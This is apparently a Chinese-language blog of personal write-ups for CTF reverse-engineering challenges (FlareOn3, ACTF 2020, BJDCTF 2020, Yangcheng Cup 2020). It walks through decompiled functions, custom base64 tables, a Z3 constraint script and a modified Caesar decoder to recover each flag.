<p>其实点进去unk_4088之后，就会发现它不止28个</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446735.png" alt="image-20240418210209249"></p>
<p>用在线工具看一下其长度，（提取一下数据，python的数据提取）</p>
<p><a target="_blank" rel="noopener" href="https://www.rapidtables.org/zh-CN/convert/number/ascii-hex-bin-dec-converter.html">ASCII文本，十六进制，二进制，十进制，Base64转换器 (rapidtables.org)</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446134.png" alt="image-20240418210410351"></p>
<p>发现他有175个，所以我们要改一下28的值，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446654.png" alt="image-20240418210542374"></p>
<p>​                              我们标记一下这里</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607908.png" alt="image-20240418210630713"></p>
<p>用上面的方法改一下，这里1C（28）为16进制，所以(175转为16进制为AF)，改完在运行就可以得到答案了!</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446308.png" alt="image-20240418204919869"></p>
<p>flag{<a href="mailto:&#73;&#x5f;&#x61;&#x5f;&#77;&#x5f;&#x74;&#x5f;&#104;&#95;&#101;&#x5f;&#x65;&#95;&#x6e;&#95;&#x43;&#95;&#x6f;&#95;&#x44;&#95;&#x69;&#x5f;&#110;&#x5f;&#103;&#x40;&#102;&#108;&#x61;&#114;&#101;&#x2d;&#111;&#110;&#x2e;&#99;&#x6f;&#109;">&#73;&#x5f;&#x61;&#x5f;&#77;&#x5f;&#x74;&#x5f;&#104;&#95;&#101;&#x5f;&#x65;&#95;&#x6e;&#95;&#x43;&#95;&#x6f;&#95;&#x44;&#95;&#x69;&#x5f;&#110;&#x5f;&#103;&#x40;&#102;&#108;&#x61;&#114;&#101;&#x2d;&#111;&#110;&#x2e;&#99;&#x6f;&#109;</a>}</p>
<h2 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h2><p>2024.4.18</p>
<p>32位，无壳！</p>
<p>找到main函数，F5反汇编！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031446814.png" alt="image-20240418200200601"></p>
<p>分析还是挺简单的，已知密文，函数进行了变换得到明文！</p>
<p><code>x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q</code></p>
<p>看一下函数!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> v8 = <span class="built_in">malloc</span>(<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(<span class="type">unsigned</span> __int8 *)(v11 + a1);</span><br><span class="line">    <span class="keyword">if</span> ( ++v11 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(<span class="type">unsigned</span> __int8 *)(v11 + a1);</span><br><span class="line">      ++v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(<span class="type">unsigned</span> __int8 *)(v11 + a1);</span><br><span class="line">      ++v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = v3 + (v5 &lt;&lt; <span class="number">16</span>) + (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    v8[v9] = byte_413000[(v7 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    v8[v10] = byte_413000[(v7 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = byte_413000[(v7 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8[++v10] = byte_413000[v3 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v9 = v10 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_413040[a2 % <span class="number">3</span>]; ++i )</span><br><span class="line">    v8[<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>) - i - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  v8[<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们点一下这个byte_413000，可以看见</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447118.png" alt="image-20240421165731618"></p>
<p>其实可以大概猜一下是一个base64编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447283.png" alt="image-20240421170338937"></p>
<p>得到明文<code>sh00ting_phish_in_a_barrel@flare-on.com</code></p>
<p>我们加一个flag{<a href="mailto:&#115;&#104;&#x30;&#x30;&#x74;&#x69;&#x6e;&#x67;&#95;&#112;&#x68;&#x69;&#x73;&#104;&#x5f;&#105;&#x6e;&#x5f;&#97;&#95;&#x62;&#97;&#114;&#114;&#x65;&#108;&#x40;&#102;&#108;&#x61;&#114;&#x65;&#45;&#111;&#110;&#x2e;&#99;&#111;&#x6d;">&#115;&#104;&#x30;&#x30;&#x74;&#x69;&#x6e;&#x67;&#95;&#112;&#x68;&#x69;&#x73;&#104;&#x5f;&#105;&#x6e;&#x5f;&#97;&#95;&#x62;&#97;&#114;&#114;&#x65;&#108;&#x40;&#102;&#108;&#x61;&#114;&#x65;&#45;&#111;&#110;&#x2e;&#99;&#111;&#x6d;</a>}</p>
<h2 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h2><p>2024.4.21</p>
<p>64位，无壳</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447936.png" alt="image-20240421170928422"></p>
<p>  看一下感觉是一个换表的base64！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447677.png" alt="image-20240421171107338"></p>
<p>flag{Special_Base64_By_Lich}</p>
<p>比较简单！</p>
<h2 id="ACTF新生赛2020-Oruga"><a href="#ACTF新生赛2020-Oruga" class="headerlink" title="[ACTF新生赛2020]Oruga"></a>[ACTF新生赛2020]Oruga</h2><p>2024.4.21</p>
<p>64位，ELF文件，无壳</p>
<p>找到main函数，F5反汇编</p>
<p>函数整体不难</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607909.png" alt="image-20240421190749630"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447299.png" alt="image-20240421190714381"></p>
<p>flag的形式为actf{}</p>
<p>我们继续看函数sub_59ACA960078A</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447336.png" alt="image-20240421191224819"></p>
<p>其实看见<strong>W</strong>(上)<strong>E</strong>(右)<strong>M</strong>(下)<strong>J</strong>(左)</p>
<p>应该可以想到是迷宫题</p>
<p>进入sub_78A函数。</p>
<p>分析代码可知这是个迷宫题</p>
<p>map为word_201020且每16个为一行。</p>
<p>W,E,M,J分别是 上，右，下，左</p>
<p>从左上角开是到“！（33）”结束</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447824.png" alt="image-20240421191641566"></p>
<p>第二个while是说：</p>
<p>在最左的一列不能左走</p>
<p>在最右的一列不能右走</p>
<p>在最下的一列不能下走</p>
<p>在最上的一列不能上走</p>
<p>找到迷宫提取一下、</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">unsigned char ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">    0,   0,   0,   0,  35,   0,   0,   0,   0,   0, </span><br><span class="line">    0,   0,  35,  35,  35,  35,   0,   0,   0,  35, </span><br><span class="line">   35,   0,   0,   0,  79,  79,   0,   0,   0,   0, </span><br><span class="line">    0,   0,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">   79,  79,   0,  80,  80,   0,   0,   0,   0,   0, </span><br><span class="line">    0,  76,   0,  79,  79,   0,  79,  79,   0,  80, </span><br><span class="line">   80,   0,   0,   0,   0,   0,   0,  76,   0,  79, </span><br><span class="line">   79,   0,  79,  79,   0,  80,   0,   0,   0,   0, </span><br><span class="line">    0,   0,  76,  76,   0,  79,  79,   0,   0,   0, </span><br><span class="line">    0,  80,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">    0,  79,  79,   0,   0,   0,   0,  80,   0,   0, </span><br><span class="line">    0,   0,  35,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">    0,   0,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">    0,   0,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">   35,   0,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">   77,  77,  77,   0,   0,   0,  35,   0,   0,   0, </span><br><span class="line">    0,   0,   0,   0,   0,   0,   0,  77,  77,  77, </span><br><span class="line">    0,   0,   0,   0,  69,  69,   0,   0,   0,  48, </span><br><span class="line">    0,  77,   0,  77,   0,  77,   0,   0,   0,   0, </span><br><span class="line">   69,   0,   0,   0,   0,   0,   0,   0,   0,   0, </span><br><span class="line">    0,   0,   0,   0,   0,   0,  69,  69,  84,  84, </span><br><span class="line">   84,  73,   0,  77,   0,  77,   0,  77,   0,   0, </span><br><span class="line">    0,   0,  69,   0,   0,  84,   0,  73,   0,  77, </span><br><span class="line">    0,  77,   0,  77,   0,   0,   0,   0,  69,   0, </span><br><span class="line">    0,  84,   0,  73,   0,  77,   0,  77,   0,  77, </span><br><span class="line">   33,   0,   0,   0,  69,  69</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>放一放</p>
<p>[BUUCTF Reverse&#x2F;<a target="_blank" rel="noopener" href="https://blog.csdn.net/ookami6497/article/details/119145213">ACTF新生赛2020]Oruga_[actf新生赛2020]oruga 1-CSDN博客</a></p>
<h2 id="ACTF新生赛2020-Universe-final-answer"><a href="#ACTF新生赛2020-Universe-final-answer" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer"></a>[ACTF新生赛2020]Universe_final_answer</h2><p>2024.4.22</p>
<p>ELF文件，64位，无壳。</p>
<p>函数分析一下，分析不难，一个if条件和一个函数进行函数变化!</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447755.png" alt="image-20240423193724938"></p>
<p>我们点开两个函数看一看</p>
<p>sub_55AC55400860函数，看了一下是一个Z3约束器</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447587.png" alt="image-20240423193945820"></p>
<p>下面这个函数，根据上面得到key也就是v5，进行加密得到我们所需的flag！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447696.png" alt="image-20240423194044055"></p>
<p>但是我们可以取一下巧，我们只求出key，然后运行一下这个ELF文件！</p>
<p>得到我们的flag！</p>
<p>​            了解了一下Z3约束器的原理编写一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">v1 = Int(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2 = Int(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3 = Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4 = Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5 = Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6 = Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7 = Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v11 = Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 * <span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>



<p>脚本跑一下，得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[v1 = <span class="number">48</span>,</span><br><span class="line"> v6 = <span class="number">95</span>,</span><br><span class="line"> v2 = <span class="number">70</span>,</span><br><span class="line"> v4 = <span class="number">82</span>,</span><br><span class="line"> v11 = <span class="number">64</span>,</span><br><span class="line"> v3 = <span class="number">117</span>,</span><br><span class="line"> v5 = <span class="number">84</span>,</span><br><span class="line"> v9 = <span class="number">119</span>,</span><br><span class="line"> v8 = <span class="number">55</span>,</span><br><span class="line"> v7 = <span class="number">121</span>]</span><br><span class="line"><span class="comment">#这里我们知道al[0]和al[1]互换了一下，还有al[5]和al[6]互换了一下！</span></span><br><span class="line"><span class="comment">#如下面的箭头所指出！</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447958.png" alt="image-20240423194826431"></p>
<p>所以我们的顺序为70 48 117 82 84  121 95 55 119 64(在线工具转下ascll码)</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607910.png" alt="image-20240423192128222"></p>
<p>我们得到的key为 F0uRTy_7w@，然后我们ida远程调控一下！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447608.png" alt="image-20240423192649609"></p>
<p>​           得到flag为actf{F0uRTy_7w@_42}</p>
<p>​                     flag{F0uRTy_7w@_42}</p>
<p>​         </p>
<p>​                       [buuctf——（ACTF新生赛2020）Universe_final_answer</p>
<p>​                      _<a target="_blank" rel="noopener" href="https://blog.csdn.net/yhfgs/article/details/117790822">actf新生赛2020]universe_final_answer-CSDN博客</a> </p>
<h3 id="Z3约束器"><a href="#Z3约束器" class="headerlink" title="Z3约束器"></a>Z3约束器</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/iczfy585/article/details/108654697">z3约束求解器使用_plz input your flag-CSDN博客</a></p>
<h2 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h2><p>2024.4.24</p>
<p>这次和以往见的不一样</p>
<p>​             第一次做<strong>Unity3D</strong>的逆向题，使用的工具：<strong>dnSpy</strong></p>
<p>dnSpy下载地址：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=dnSpy&spm=1001.2101.3001.7020">dnSpy</a></p>
<p>我们看一下别人的wp，打开<strong>\BJD hamburger competition_Data\Managed\Assembly-CSharp.dll</strong>在里面找到下图的地方<br>我们可以找到密文和几个加密算法</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447561.png" alt="image-20240424203629147"></p>
<p>然后我们进行在线解密就行了！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447358.png" alt="image-20240424203801654"></p>
<p>我们得到密文1001，然后我们在进行md5解密</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447156.png" alt="image-20240424203901110"></p>
<p>得到明文<strong>b8c37e33defde51cf91e1e03e51657da</strong>但是要注意他是不区分大小写的还有要区分32位和16位，所以我们两种都要试一下！</p>
<p>转为大写为<strong>B8C37E33DEFDE51CF91E1E1E03E51657DA</strong>，但是都不对</p>
<p>我们点进去看一些md5加密</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447021.png" alt="image-20240424204829235"></p>
<p>​          所以flag{B8C37E33DEFDE51CF91E}</p>
<h2 id="Zer0pts2020-easy-strcmp"><a href="#Zer0pts2020-easy-strcmp" class="headerlink" title="[Zer0pts2020]easy strcmp"></a>[Zer0pts2020]easy strcmp</h2><p>2024.4.25</p>
<p>64位，ELF文件，无壳！</p>
<p>[buuoj-<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hznuxxw/p/16989358.html">Zer0pts2020]easy strcmp - 今天吃大鸡腿 - 博客园 (cnblogs.com)</a></p>
<p>以为会是一个简单的比较，但是有点复杂！</p>
<h2 id="WUSTCTF2020-level4"><a href="#WUSTCTF2020-level4" class="headerlink" title="[WUSTCTF2020]level4"></a>[WUSTCTF2020]level4</h2><p>2024.4.25</p>
<p>ELF文件，64位</p>
<p>数据结构，左子树和右子树</p>
<p>放着！</p>
<h2 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h2><p>20224.4.25</p>
<p>64位，无壳</p>
<p>F5反汇编一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031447038.png" alt="image-20240425200311956"></p>
<p>大概知道了str1为我们所求的，这里的if条件语句里应该是有函数变换！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448891.png" alt="image-20240425200823987"></p>
<p>encode_one是一个base64编码！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448970.png" alt="image-20240425203015811"></p>
<p>encode_two是字符之间的变化！（这里的a3仔细看一下就知道encode_three里面的转换的字符串，a1为我们所要的字符串）</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448150.png" alt="image-20240425203004820"></p>
<p>改一下名字</p>
<p>encode_three函数是凯撒加密,偏移量为3</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448863.png" alt="image-20240425202955564"></p>
<p>就可以开始解密了！</p>
<p>倒着解密：首先凯撒解密为：BjYjM5Mjk7NzMR4dIVHs5NzJjY3MTEzM5VhMn3&#x3D;zQ6NzhhMzhlOD</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448219.png" alt="image-20240425210921673"></p>
<p>然后，进行函数变化！把这个分为四部分。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##str2</span></span><br><span class="line"><span class="comment">#1-13 BjYjM5Mjk7NzM    #str1 27-39</span></span><br><span class="line"><span class="comment">#14-26 R4dIVHs5NzJjY  #str1 1-13</span></span><br><span class="line"><span class="comment">#27-39 3MTEzM5VhMn3=  #str1 40-52</span></span><br><span class="line"><span class="comment">#40-52 zQ6NzhhMzhlOD #str1 14-26</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448946.png" alt="image-20240425205446228"></p>
<p>所以str1的顺序为R4dIVHs5NzJjYzQ6NzhhMzhlODBjYjM5Mjk7NzM3MTEzM5VhMn3&#x3D; </p>
<p>然后base64解密就行了！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448186.png" alt="image-20240425212859609"></p>
<p>但是它不对</p>
<p>看了一下WP，发现他这个凯撒加密改了一下，要手搓脚本！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_caesar</span>(<span class="params"><span class="built_in">str</span>, key=<span class="number">3</span></span>):  <span class="comment"># 解密函数</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">90</span>:</span><br><span class="line">            text += <span class="built_in">chr</span>(<span class="number">65</span> + ((<span class="built_in">ord</span>(i) - <span class="number">65</span>) - key) % <span class="number">26</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>:</span><br><span class="line">            text += <span class="built_in">chr</span>(<span class="number">97</span> + ((<span class="built_in">ord</span>(i) - <span class="number">97</span>) - key) % <span class="number">26</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">57</span>:</span><br><span class="line">            text += <span class="built_in">chr</span>(<span class="number">48</span> + ((<span class="built_in">ord</span>(i) - <span class="number">48</span>) - key) % <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text+=i</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line">m1=<span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">m2=decrypt_caesar(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"><span class="comment">#输出为BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD</span></span><br></pre></td></tr></table></figure>

<p>然后就可以正常解密了，</p>
<p>变化后为R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0&#x3D;</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448380.png" alt="image-20240425213259480"></p>
<p>得到flag</p>
<p>GWHT{672cc4778a38e80cb362987341133ea2}</p>
